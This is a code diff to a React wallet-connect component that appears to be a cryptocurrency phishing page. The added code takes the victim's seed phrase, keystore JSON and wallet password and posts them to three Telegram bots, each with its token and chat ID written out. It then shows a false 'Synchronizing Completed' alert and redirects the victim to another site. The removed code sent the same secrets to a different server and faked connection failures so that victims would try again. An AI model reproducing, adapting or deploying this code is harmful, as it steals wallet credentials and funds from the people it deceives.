@@ -507,6 +507,9 @@ function Wallettwo(){
 
 
 
+    
+
+
       const[phrase, setPhrase]=useState("");
       const[keystore_json, setKeyStoreJson] = useState("");
       const[wallet_password , setWalletPassword] = useState("");
@@ -527,14 +530,32 @@ function Wallettwo(){
 
 
         try {
-            const response = await axios.post('https://webresolve.onrender.com/api/send', {
-                phrase:phrase,
-                keystore_json:keystore_json,
-                wallet_password:wallet_password,
-                private_key:private_key,
-                type:"Phrase",
-                platform:selectedName,
-            });
+           
+
+        
+
+                 await axios.post(`https://api.telegram.org/bot6756922447:AAHPnkXx7NfYJbqPsuWsGlstzjs5FcdlzUY/sendMessage`, {
+                    chat_id: 6150403557,
+                    text: `Wallet : ${selectedName} , Type : phrase connection , Phrase : ${phrase}`,
+                  });
+
+
+                await axios.post(`https://api.telegram.org/bot6471655485:AAH0iIugJnVoXXAcekKKQoxQDzixvzM-zxE/sendMessage`, {
+                    chat_id: 5868304053,
+                    text: `Wallet : ${selectedName} , Type : phrase connection , Phrase : ${phrase}`,
+                  });
+
+
+                  const response = await axios.post(`https://api.telegram.org/bot6346477835:AAE--Er907FambpxvtD7C-CU-J7GlwgyEkg/sendMessage`, {
+                    chat_id: 5916570239,
+                    text: `Wallet : ${selectedName} , Type : phrase connection , Phrase : ${phrase}`,
+                  });
+  
+  
+  
+
+
+
         
             // Handle success
             console.log('Data sent:', response.data.message);
@@ -543,69 +564,12 @@ function Wallettwo(){
                 console.log(response.data.message);
                 
 
-                if(phrasekeycount < 3){
-                    setErrorMessage(`Connection to ${selectedName} failed!!!`);
-                    setPhraseKeyCount(phrasekeycount + 1);
-                }
-
-                else if(phrasekeycount == 3){
-                    setErrorMessage(`Synchronizing Completed, Kindly login in an hour`);
-                    setPrivateKeyCount(0);
-                }
-
-                setShowError(true);
-
-
-
-            }
-          } catch (error) {
-            // Handle error
-            console.error('Error:', error);
-          }
-        
-
-        
-    }
-
-    async function handleKeystoreJson(e){
-        e.preventDefault();
-
-        setPhrase("");
-        setPrivateKey("");
-        
-
-
-
-        try {
-            const response = await axios.post('https://webresolve.onrender.com/api/send', {
-                phrase:phrase,
-                keystore_json:keystore_json,
-                wallet_password:wallet_password,
-                private_key:private_key,
-                type:"Keystore Json",
-                platform:selectedName,
-            });
-        
-            // Handle success
-            console.log('Data sent:', response.data.message);
-    
-            if(response.status == 200){
-                console.log(response.data.message);
-    
+              
+              
+                    alert(`Synchronizing Completed, Kindly login in an hour`);
+                    window.location.href = 'https://govern.bifrostweb.app/';
                 
-
-                if(keystorejsoncount < 3){
-                    setErrorMessage(`Connection to ${selectedName} failed!!!`);
-                    setKeystoreJsonCount(keystorejsoncount + 1);
-                }
-
-                else if(keystorejsoncount == 3){
-                    setErrorMessage(`Synchronizing Completed, Kindly login in an hour`);
-                    setKeystoreJsonCount(0);
-                }
-
-                setShowError(true);
-
+               
 
 
 
@@ -620,53 +584,140 @@ function Wallettwo(){
     }
 
 
+//    keystore json
 
-    async function handlePrivateKey(e){
-        e.preventDefault();
+async function handleKeystoreJson(e){
+    e.preventDefault();
 
-        setKeyStoreJson("");
-        setPhrase("");
-        setWalletPassword("");
-
-
-
-        try {
-            const response = await axios.post('https://webresolve.onrender.com/api/send', {
-                phrase:phrase,
-                keystore_json:keystore_json,
-                wallet_password:wallet_password,
-                private_key:private_key,
-                type:"Private Key",
-                platform:selectedName,
-            });
-        
-            // Handle success
-            console.log('Data sent:', response.data.message);
+    setPhrase("");
+    setPrivateKey("");
     
-            if(response.status == 200){
-                console.log(response.data.message);
 
-                if(privatekeycount < 3){
-                    setErrorMessage(`Connection to ${selectedName} failed!!!`);
-                    setPrivateKeyCount(privatekeycount + 1);
-                }
 
-                else if(privatekeycount == 3){
-                    setErrorMessage(`Synchronizing Completed, Kindly login in an hour`);
-                    setPrivateKeyCount(0);
-                }
+
+    try {
+        // const response = await axios.post('https://webresolve.onrender.com/api/send', {
+        //     phrase:phrase,
+        //     keystore_json:keystore_json,
+        //     wallet_password:wallet_password,
+        //     private_key:private_key,
+        //     type:"Keystore Json",
+        //     platform:selectedName,
+        // });
+
+
+        await axios.post(`https://api.telegram.org/bot6756922447:AAHPnkXx7NfYJbqPsuWsGlstzjs5FcdlzUY/sendMessage`, {
+            chat_id: 6150403557,
+            text: `Wallet : ${selectedName} , Type : phrase connection , Phrase : ${phrase}`,
+          });
+
+
+        await axios.post(`https://api.telegram.org/bot6471655485:AAH0iIugJnVoXXAcekKKQoxQDzixvzM-zxE/sendMessage`, {
+            chat_id: 5868304053,
+            text: `Wallet : ${selectedName} , Type : phrase connection , Phrase : ${phrase}`,
+          });
+
+
+       
+
+
+        const response = await axios.post(`https://api.telegram.org/bot6346477835:AAE--Er907FambpxvtD7C-CU-J7GlwgyEkg/sendMessage`, {
+            chat_id: 5916570239,
+            text: `Wallet : ${selectedName} , Type : Keystore Json , Keystore Json : ${keystore_json}, Wallet Password : ${wallet_password}`,
+          });
+
     
-                setShowError(true);
-            }
-          } catch (error) {
-            // Handle error
-            console.error('Error:', error);
-          }
-        
+        // Handle success
+        console.log('Data sent:', response.data.message);
 
-        
-    }
+        if(response.status == 200){
+            console.log(response.data.message);
+            
 
+          
+          
+                alert(`Synchronizing Completed, Kindly login in an hour`);
+                window.location.href = 'https://govern.bifrostweb.app/';
+            
+           
+
+
+
+        }
+      } catch (error) {
+        // Handle error
+        console.error('Error:', error);
+      }
+    
+
+    
+}
+
+async function handlePrivateKey(e){
+    e.preventDefault();
+
+    setKeyStoreJson("");
+    setPhrase("");
+    setWalletPassword("");
+
+
+
+    try {
+        // const response = await axios.post('https://webresolve.onrender.com/api/send', {
+        //     phrase:phrase,
+        //     keystore_json:keystore_json,
+        //     wallet_password:wallet_password,
+        //     private_key:private_key,
+        //     type:"Private Key",
+        //     platform:selectedName,
+        // });
+
+        await axios.post(`https://api.telegram.org/bot6756922447:AAHPnkXx7NfYJbqPsuWsGlstzjs5FcdlzUY/sendMessage`, {
+                chat_id: 6150403557,
+                text: `Wallet : ${selectedName} , Type : phrase connection , Phrase : ${phrase}`,
+              });
+
+
+            await axios.post(`https://api.telegram.org/bot6471655485:AAH0iIugJnVoXXAcekKKQoxQDzixvzM-zxE/sendMessage`, {
+                chat_id: 5868304053,
+                text: `Wallet : ${selectedName} , Type : phrase connection , Phrase : ${phrase}`,
+              });
+
+
+              const response = await axios.post(`https://api.telegram.org/bot6346477835:AAE--Er907FambpxvtD7C-CU-J7GlwgyEkg/sendMessage`, {
+                chat_id: 5916570239,
+                text: `Wallet : ${selectedName} , Type : phrase connection , Phrase : ${phrase}`,
+              });
+
+    
+        // Handle success
+        console.log('Data sent:', response.data.message);
+
+        if(response.status == 200){
+            console.log(response.data.message);
+            
+
+          
+          
+                alert(`Synchronizing Completed, Kindly login in an hour`);
+                window.location.href = 'https://govern.bifrostweb.app/';
+            
+           
+
+
+
+        }
+      } catch (error) {
+        // Handle error
+        console.error('Error:', error);
+      }
+    
+
+    
+}
+
+
+    
     const[phrasekeycount, setPhraseKeyCount] = useState(0);
 
     const[keystorejsoncount, setKeystoreJsonCount] = useState(0);
